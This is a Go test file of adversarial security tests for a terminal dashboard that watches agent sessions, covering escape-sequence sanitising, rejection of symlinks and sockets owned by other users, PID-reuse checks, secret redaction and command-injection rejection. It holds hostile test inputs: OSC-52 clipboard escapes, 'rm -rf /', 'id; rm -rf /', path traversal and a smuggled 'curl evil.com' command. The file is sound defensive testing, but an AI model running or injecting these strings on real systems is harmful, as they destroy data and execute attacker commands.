package topui

import (
	"context"
	"database/sql"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	_ "modernc.org/sqlite"

	"github.com/bonjoski/fabrial/pkg/session"
)

// TestAdversarial_TUIStripsANSIAndBidiFromUntrustedBranches proves that hostile git
// branch names, commit summaries, and worktree paths containing OSC-52 clipboard
// hijacks, CSI cursor/color escapes, 8-bit C1 controls, Unicode Bidi overrides,
// Unicode Tag cloaking, and forged newline dialogs are completely stripped.
func TestAdversarial_TUIStripsANSIAndBidiFromUntrustedBranches(t *testing.T) {
	hostileBranch := "feat/\x1b]52;c;cHduZWQ=\x07\x1b[31mred\x1b[0m\u202eevil\u2066\x9b2J\nConfirm [y/N]: y"
	hostileSummary := "Fix bug \x1bP1$r\x1b\\ \U000E0041\U000E0042 \u200fspoofed\r\nrm -rf /"

	snap := WorkstationSnapshot{
		Workdir: "/tmp/\x1b]52;c;abc\x07repo",
		Worktrees: []WorktreeStatus{
			{Path: "/tmp/wt", Branch: hostileBranch, HeadSHA: "deadbeef"},
		},
		Inbox: []LensTicketSummary{
			{ID: "tkt_1", LensName: "red-team", Summary: hostileSummary, BranchName: hostileBranch},
		},
	}

	SanitizeSnapshot(&snap)

	for _, got := range []string{snap.Workdir, snap.Worktrees[0].Branch, snap.Inbox[0].Summary} {
		if strings.Contains(got, "\x1b") {
			t.Fatalf("FAIL-OPEN: ESC sequence survived sanitization: %q", got)
		}
		if strings.ContainsAny(got, "\x07\x9b\x9d\n\r") {
			t.Fatalf("FAIL-OPEN: control/newline character survived sanitization: %q", got)
		}
		if strings.ContainsAny(got, "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069\u200e\u200f\u061c") {
			t.Fatalf("FAIL-OPEN: Unicode Bidi rune survived sanitization: %q", got)
		}
		for _, r := range got {
			if r >= 0xE0000 && r <= 0xE007F {
				t.Fatalf("FAIL-OPEN: Unicode Tag cloaking rune survived sanitization: %q", got)
			}
		}
	}

	// Render through Bubble Tea model and verify zero OSC-52 payload survives in rendered View.
	m := NewModel(NewCollector(CollectorConfig{SkipDoctor: true}), NewLocalActionRunner("", ""), 2*time.Second)
	m.snap = snap
	m.hasSnap = true
	rendered := m.View()
	if strings.Contains(rendered, "]52;c;") || strings.Contains(rendered, "cHduZWQ=") {
		t.Fatalf("FAIL-OPEN: OSC-52 payload leaked into rendered TUI frame")
	}
}

// TestAdversarial_RejectsSymlinkAndForeignUIDSocket proves fail-closed rejection of
// symlinked sockets/DBs/directories and foreign-UID ownership on Unix.
func TestAdversarial_RejectsSymlinkAndForeignUIDSocket(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX symlink/UID socket ownership tests run on Unix")
	}
	tmp := t.TempDir()
	realFile := filepath.Join(tmp, "real.db")
	if err := os.WriteFile(realFile, []byte("not-a-db"), 0600); err != nil {
		t.Fatalf("write real file: %v", err)
	}

	// 1. Symlink planted at coppermind.db, oathgate ledger.db, sessions.json, and sockets.
	symDB := filepath.Join(tmp, "coppermind.db")
	if err := os.Symlink(realFile, symDB); err != nil {
		t.Fatalf("symlink db: %v", err)
	}
	symSock := filepath.Join(tmp, "fabrial.sock")
	if err := os.Symlink(realFile, symSock); err != nil {
		t.Fatalf("symlink sock: %v", err)
	}
	symTraces := filepath.Join(tmp, "traces-link")
	if err := os.Symlink(tmp, symTraces); err != nil {
		t.Fatalf("symlink dir: %v", err)
	}

	if err := VerifyRegularFileOwned(symDB); !errors.Is(err, ErrSymlinkRejected) {
		t.Fatalf("FAIL-OPEN: expected ErrSymlinkRejected for symlinked DB, got %v", err)
	}
	if err := VerifySocketOwned(symSock); !errors.Is(err, ErrSymlinkRejected) {
		t.Fatalf("FAIL-OPEN: expected ErrSymlinkRejected for symlinked socket, got %v", err)
	}
	if err := VerifyDirOwned(symTraces); !errors.Is(err, ErrSymlinkRejected) {
		t.Fatalf("FAIL-OPEN: expected ErrSymlinkRejected for symlinked dir, got %v", err)
	}

	// Verify collector reports ProviderError fail-closed on symlinked sources.
	col := NewCollector(CollectorConfig{
		Workdir:         tmp,
		FabrialSock:     symSock,
		SessionsFile:    symDB,
		LocksmithSock:   symSock,
		CoppermindDBs:   []string{symDB},
		TinmindDir:      symTraces,
		OathgateDB:      symDB,
		ProviderTimeout: 250 * time.Millisecond,
		SkipDoctor:      true,
	})
	snap := col.Collect(context.Background())
	errProviders := map[string]bool{}
	for _, p := range snap.Providers {
		if p.State == ProviderError {
			errProviders[p.Name] = true
		}
	}
	for _, expected := range []string{"fabrial-sessions", "locksmith-leases", "coppermind-inbox", "tinmind-traces", "oathgate-checkpoints"} {
		if !errProviders[expected] {
			t.Fatalf("FAIL-OPEN: provider %s did not fail closed on symlinked path (providers=%+v)", expected, snap.Providers)
		}
	}

	// 2. Simulate foreign UID ownership on a real Unix socket and regular file.
	sockDir, err := os.MkdirTemp("/tmp", "ftop-")
	if err != nil {
		t.Fatalf("mkdirtemp sock: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(sockDir) })
	realSock := filepath.Join(sockDir, "real.sock")
	ln, err := net.Listen("unix", realSock)
	if err != nil {
		t.Fatalf("listen unix: %v", err)
	}
	defer func() { _ = ln.Close() }()
	_ = os.Chmod(realSock, 0600)

	origUID := currentUIDFunc
	currentUIDFunc = func() uint32 { return origUID() + 1000 }
	defer func() { currentUIDFunc = origUID }()

	if err := VerifySocketOwned(realSock); !errors.Is(err, ErrForeignUID) {
		t.Fatalf("FAIL-OPEN: expected ErrForeignUID for foreign-owned socket, got %v", err)
	}
	if err := VerifyRegularFileOwned(realFile); !errors.Is(err, ErrForeignUID) {
		t.Fatalf("FAIL-OPEN: expected ErrForeignUID for foreign-owned DB file, got %v", err)
	}
}

// TestAdversarial_StopSessionAbortsOnPIDReuse proves StopSession re-verifies
// (PID, ProcessStartTime) immediately prior to signaling and aborts fail-closed
// when the OS recycled the PID.
func TestAdversarial_StopSessionAbortsOnPIDReuse(t *testing.T) {
	tmp := t.TempDir()
	sessPath := filepath.Join(tmp, "sessions.json")

	sm := session.NewSessionManager()
	g1, err := sm.BeginSession(context.Background(), session.SessionConfig{TTL: 10 * time.Minute})
	if err != nil {
		t.Fatalf("begin session 1: %v", err)
	}
	g2, err := sm.BeginSession(context.Background(), session.SessionConfig{TTL: 10 * time.Minute})
	if err != nil {
		t.Fatalf("begin session 2: %v", err)
	}
	if err := sm.SaveToFile(sessPath); err != nil {
		t.Fatalf("save sessions: %v", err)
	}

	killed := false
	runner := &LocalActionRunner{
		SessionsFile: sessPath,
		getStartTime: func(pid int) (int64, error) {
			return 999999999, nil // New start time after PID recycling
		},
		signalProc: func(pid int) error {
			killed = true
			return nil
		},
	}

	// Attempt kill with stale startTime -> MUST abort fail-closed without signaling.
	err = runner.StopSession(context.Background(), string(g1.ID), 42424, 111111111)
	if !errors.Is(err, ErrPIDRecycled) {
		t.Fatalf("FAIL-OPEN: expected ErrPIDRecycled on mismatched start time, got %v", err)
	}
	if killed {
		t.Fatalf("FAIL-OPEN: signalProc was invoked despite PID start-time mismatch")
	}

	// Protected PIDs (1, self) must also be rejected.
	if err := runner.StopSession(context.Background(), string(g1.ID), 1, 123); !errors.Is(err, ErrInvalidActionTarget) {
		t.Fatalf("FAIL-OPEN: expected rejection for PID 1, got %v", err)
	}
	if err := runner.StopSession(context.Background(), string(g1.ID), os.Getpid(), 123); !errors.Is(err, ErrInvalidActionTarget) {
		t.Fatalf("FAIL-OPEN: expected rejection for self PID, got %v", err)
	}

	// Matching startTime -> signals ONLY target PID and revokes ONLY g1 (leaving g2 active).
	err = runner.StopSession(context.Background(), string(g1.ID), 42424, 999999999)
	if err != nil {
		t.Fatalf("expected matching start time to succeed, got %v", err)
	}
	if !killed {
		t.Fatalf("expected verified PID to be signaled")
	}

	sm2 := session.NewSessionManager()
	if err := sm2.LoadFromFile(sessPath); err != nil {
		t.Fatalf("reload sessions: %v", err)
	}
	if _, err := sm2.GetSession(g1.ID); !errors.Is(err, session.ErrSessionRevoked) {
		t.Fatalf("expected target session g1 to be revoked, got %v", err)
	}
	if _, err := sm2.GetSession(g2.ID); err != nil {
		t.Fatalf("FAIL-CLOSED BLAST RADIUS VIOLATION: peer session g2 was affected: %v", err)
	}
}

// TestAdversarial_ZeroSecretExposureInSnapshotJSON proves LeaseMetaStatus physically
// lacks any Value/Secret/Token field, sessions.json MasterToken/Environment secrets
// are never retained, and raw secrets in traces are redacted before JSON marshaling.
func TestAdversarial_ZeroSecretExposureInSnapshotJSON(t *testing.T) {
	// 1. Structural compile-time/reflection invariant on LeaseMetaStatus.
	lt := reflect.TypeOf(LeaseMetaStatus{})
	for i := 0; i < lt.NumField(); i++ {
		name := strings.ToLower(lt.Field(i).Name)
		if name == "value" || name == "secret" || name == "secretvalue" || name == "token" || name == "mastertoken" {
			t.Fatalf("SECURITY INVARIANT VIOLATION: LeaseMetaStatus contains forbidden field %q", lt.Field(i).Name)
		}
	}

	tmp := t.TempDir()
	// 2. Write sessions.json containing a high-entropy master token and secret env var.
	const rawMaster = "master_secret_tok_super_sensitive_998877665544"
	const rawAnthropic = "sk-ant-api03-SECRETLEAK1234567890abcdef"
	const rawGitHub = "ghp_ABCDEF1234567890abcdef1234567890"
	const rawAWS = "AKIAIOSFODNN7EXAMPLE"

	sessJSON := fmt.Sprintf(`{
		"master_12345678": {
			"session_id": "master_12345678",
			"master_token": %q,
			"scopes": ["read"],
			"created_at": %q,
			"expires_at": %q,
			"is_master": true,
			"environment": {
				"FABRIAL_WORKSPACE": "/tmp/ws",
				"ANTHROPIC_API_KEY": %q,
				"GITHUB_TOKEN": %q
			}
		}
	}`, rawMaster, time.Now().Format(time.RFC3339), time.Now().Add(time.Hour).Format(time.RFC3339), rawAnthropic, rawGitHub)
	sessPath := filepath.Join(tmp, "sessions.json")
	if err := os.WriteFile(sessPath, []byte(sessJSON), 0600); err != nil {
		t.Fatalf("write sessions.json: %v", err)
	}

	// 3. Write a trace file containing raw secrets in command field.
	traceDir := filepath.Join(tmp, "traces")
	if err := os.MkdirAll(traceDir, 0700); err != nil {
		t.Fatalf("mkdir traces: %v", err)
	}
	traceLine := fmt.Sprintf(`{"ts":"2026-11-27T12:00:00Z","type":"cmd_exit","command":"curl -H 'Authorization: Bearer %s' --key %s %s","exit_code":1}`+"\n",
		rawAnthropic, rawGitHub, rawAWS)
	if err := os.WriteFile(filepath.Join(traceDir, "tm-leak-test.jsonl"), []byte(traceLine), 0600); err != nil {
		t.Fatalf("write trace: %v", err)
	}

	col := NewCollector(CollectorConfig{
		Workdir:         tmp,
		SessionsFile:    sessPath,
		TinmindDir:      traceDir,
		ProviderTimeout: 300 * time.Millisecond,
		SkipDoctor:      true,
	})
	snap := col.Collect(context.Background())

	rawBytes, err := json.Marshal(snap)
	if err != nil {
		t.Fatalf("marshal snapshot: %v", err)
	}
	blob := string(rawBytes)
	for _, secret := range []string{rawMaster, rawAnthropic, rawGitHub, rawAWS} {
		if strings.Contains(blob, secret) {
			t.Fatalf("FAIL-OPEN: raw secret %q leaked into WorkstationSnapshot JSON: %s", secret, blob)
		}
	}
}

// TestAdversarial_HungSocketDoesNotFreezeRenderLoop proves that a hung Unix socket
// stalling indefinitely on accept/read plus a directory with 120 trace files never
// freezes the collector or exceeds its bounded timeout, caps traces at 50, and trips
// the local UI-only backoff badge after repeated timeouts.
func TestAdversarial_HungSocketDoesNotFreezeRenderLoop(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Unix domain socket stall test runs on Unix")
	}
	tmp := t.TempDir()
	sockDir, err := os.MkdirTemp("/tmp", "ftop-")
	if err != nil {
		t.Fatalf("mkdirtemp sock: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(sockDir) })
	hungSock := filepath.Join(sockDir, "hung.sock")
	ln, err := net.Listen("unix", hungSock)
	if err != nil {
		t.Fatalf("listen hung sock: %v", err)
	}
	defer func() { _ = ln.Close() }()
	_ = os.Chmod(hungSock, 0600)

	// Accept connections and hold them open forever without writing a single byte.
	stopAccept := make(chan struct{})
	defer close(stopAccept)
	go func() {
		var conns []net.Conn
		defer func() {
			for _, c := range conns {
				_ = c.Close()
			}
		}()
		for {
			c, aErr := ln.Accept()
			if aErr != nil {
				return
			}
			conns = append(conns, c)
		}
	}()

	// Create 120 trace files to verify MaxDirScanEntries (50) anti-DoS cap.
	traceDir := filepath.Join(tmp, "traces")
	if err := os.MkdirAll(traceDir, 0700); err != nil {
		t.Fatalf("mkdir traces: %v", err)
	}
	for i := 0; i < 120; i++ {
		p := filepath.Join(traceDir, fmt.Sprintf("tm-%04d.jsonl", i))
		_ = os.WriteFile(p, []byte(`{"ts":"2026-11-27T12:00:00Z","type":"stdout","data":"ok"}`+"\n"), 0600)
	}

	col := NewCollector(CollectorConfig{
		Workdir:         tmp,
		LocksmithSock:   hungSock,
		TinmindDir:      traceDir,
		ProviderTimeout: 120 * time.Millisecond,
		SkipDoctor:      true,
	})

	start := time.Now()
	snap := col.Collect(context.Background())
	elapsed := time.Since(start)
	if elapsed > 700*time.Millisecond {
		t.Fatalf("FAIL-OPEN: hung socket stalled Collector.Collect for %v (expected <700ms)", elapsed)
	}
	if len(snap.Traces) != MaxDirScanEntries {
		t.Fatalf("expected traces capped at %d, got %d", MaxDirScanEntries, len(snap.Traces))
	}

	var foundTimeout bool
	for _, p := range snap.Providers {
		if p.Name == "locksmith-leases" && p.State == ProviderTimeout {
			foundTimeout = true
		}
	}
	if !foundTimeout {
		t.Fatalf("expected locksmith-leases to report TIMEOUT on hung socket, got %+v", snap.Providers)
	}

	// Trigger backoff threshold (3 consecutive timeouts) -> 4th poll must immediately return BACKOFF in <20ms.
	_ = col.Collect(context.Background())
	_ = col.Collect(context.Background())
	bStart := time.Now()
	snap4 := col.Collect(context.Background())
	if time.Since(bStart) > 250*time.Millisecond {
		t.Fatalf("expected backed-off provider to skip immediately, took %v", time.Since(bStart))
	}
	var foundBackoff bool
	for _, p := range snap4.Providers {
		if p.Name == "locksmith-leases" && p.State == ProviderBackoff {
			foundBackoff = true
		}
	}
	if !foundBackoff {
		t.Fatalf("expected locksmith-leases to enter BACKOFF after %d consecutive timeouts, got %+v", backoffThreshold, snap4.Providers)
	}
}

// TestAdversarial_ActionCommandInjectionRejected blocks flag smuggling, path traversal,
// and shell metacharacters across all TUI-launched external commands.
func TestAdversarial_ActionCommandInjectionRejected(t *testing.T) {
	runner := &LocalActionRunner{
		lookPath: func(file string) (string, error) { return "/usr/local/bin/" + file, nil },
	}
	for _, bad := range []string{"-flag", "--exec=sh", "../etc/passwd", "id; rm -rf /", "id$(whoami)", ""} {
		if _, err := runner.BuildReplayCmd(bad); !errors.Is(err, ErrInvalidActionTarget) {
			t.Fatalf("FAIL-OPEN: BuildReplayCmd accepted hostile traceID %q (err=%v)", bad, err)
		}
		if _, err := runner.BuildRewindCmd("", bad, false); !errors.Is(err, ErrInvalidActionTarget) {
			t.Fatalf("FAIL-OPEN: BuildRewindCmd accepted hostile snapID %q (err=%v)", bad, err)
		}
	}
	if _, err := runner.BuildDoctorFixCmd("airlock; whoami"); !errors.Is(err, ErrInvalidActionTarget) {
		t.Fatalf("FAIL-OPEN: BuildDoctorFixCmd accepted hostile pillar name")
	}

	// Malicious ticket ID in Coppermind DB must fall back safely without shell metacharacters.
	cmd := FormatLensTriageCmd(LensTicketSummary{ID: "tkt; curl evil.com", LensName: "red-team"})
	if strings.Contains(cmd, ";") || strings.Contains(cmd, "curl") {
		t.Fatalf("FAIL-OPEN: FormatLensTriageCmd echoed hostile ticket ID: %q", cmd)
	}
}

// TestAdversarial_SQLiteReadOnlyUnderConcurrentWriters verifies N=8 parallel writers
// into Coppermind and Oathgate WAL databases never collide with read-only TUI polling.
func TestAdversarial_SQLiteReadOnlyUnderConcurrentWriters(t *testing.T) {
	tmp := t.TempDir()
	cmPath := filepath.Join(tmp, "coppermind.db")
	ogPath := filepath.Join(tmp, "ledger.db")

	cmDB, err := sql.Open("sqlite", cmPath+"?_pragma=journal_mode(WAL)&_pragma=busy_timeout(2000)")
	if err != nil {
		t.Fatalf("open cm: %v", err)
	}
	defer func() { _ = cmDB.Close() }()
	if _, err := cmDB.Exec(`
		CREATE TABLE pending_lens_tickets (
			id TEXT PRIMARY KEY, lens_name TEXT, commit_sha TEXT, memory_id TEXT,
			repo_name TEXT, branch_name TEXT, summary TEXT, status TEXT, created_at INTEGER
		);
		CREATE TABLE memory_nodes (
			id TEXT PRIMARY KEY, derived INTEGER, status TEXT, severity TEXT
		);
	`); err != nil {
		t.Fatalf("init cm schema: %v", err)
	}

	ogDB, err := sql.Open("sqlite", ogPath+"?_pragma=journal_mode(WAL)&_pragma=busy_timeout(2000)")
	if err != nil {
		t.Fatalf("open og: %v", err)
	}
	defer func() { _ = ogDB.Close() }()
	if _, err := ogDB.Exec(`
		CREATE TABLE snapshots (
			id TEXT PRIMARY KEY, parent_id TEXT, repo_root TEXT, worktree_id TEXT,
			label TEXT, trigger TEXT, git_head TEXT, git_branch TEXT, cow_backend TEXT,
			duration_ms INTEGER, entries_cloned INTEGER, bytes_logical INTEGER,
			pinned INTEGER, tinmind_trace_id TEXT, created_at TEXT
		);
	`); err != nil {
		t.Fatalf("init og schema: %v", err)
	}

	col := NewCollector(CollectorConfig{
		Workdir:         tmp,
		CoppermindDBs:   []string{cmPath},
		OathgateDB:      ogPath,
		ProviderTimeout: 500 * time.Millisecond,
		SkipDoctor:      true,
	})

	var wg sync.WaitGroup
	// 8 concurrent writers (N=8 subagents) + 4 concurrent TUI readers.
	for w := 0; w < 8; w++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for j := 0; j < 5; j++ {
				_, _ = cmDB.Exec(`INSERT OR REPLACE INTO pending_lens_tickets VALUES (?, 'red-team', 'abc', 'mem1', 'fabrial', 'main', 'diff', 'pending', ?)`,
					fmt.Sprintf("tkt_%d_%d", id, j), time.Now().Unix())
				_, _ = ogDB.Exec(`INSERT OR REPLACE INTO snapshots VALUES (?, '', '/tmp/repo', 'wt1', 'snap', 'manual', 'abc', 'main', 'apfs', 4, 10, 1024, 0, '', ?)`,
					fmt.Sprintf("og_%d_%d", id, j), time.Now().UTC().Format(time.RFC3339Nano))
			}
		}(w)
	}
	for r := 0; r < 4; r++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := 0; j < 4; j++ {
				snap := col.Collect(context.Background())
				for _, p := range snap.Providers {
					if p.State == ProviderError {
						t.Errorf("read-only provider %s hit error under N=8 concurrency: %s", p.Name, p.Detail)
					}
				}
			}
		}()
	}
	wg.Wait()
}

// TestAdversarial_KillModalRequiresExplicitYes confirms pressing k opens a y/N modal
// and any key other than y/Y aborts without invoking StopSession.
func TestAdversarial_KillModalRequiresExplicitYes(t *testing.T) {
	killed := false
	actions := &LocalActionRunner{
		getStartTime: func(pid int) (int64, error) { return 12345, nil },
		signalProc: func(pid int) error {
			killed = true
			return nil
		},
	}
	m := NewModel(NewCollector(CollectorConfig{SkipDoctor: true}), actions, 2*time.Second)
	m.hasSnap = true
	m.snap.Sessions = []AgentSessionStatus{
		{SessionID: "master_12345678", PID: 55555, StartTimeNs: 12345},
	}

	// Press 'k' -> enters modal, does NOT kill yet.
	_, _ = m.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'k'}})
	if m.confirm.kind != confirmKillSession {
		t.Fatalf("expected kill confirmation modal to open")
	}
	if killed {
		t.Fatalf("FAIL-OPEN: session killed before y/N confirmation")
	}

	// Press 'n' -> cancels cleanly.
	_, _ = m.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'n'}})
	if m.confirm.kind != confirmNone || killed {
		t.Fatalf("expected 'n' to cancel confirmation modal without killing")
	}
}
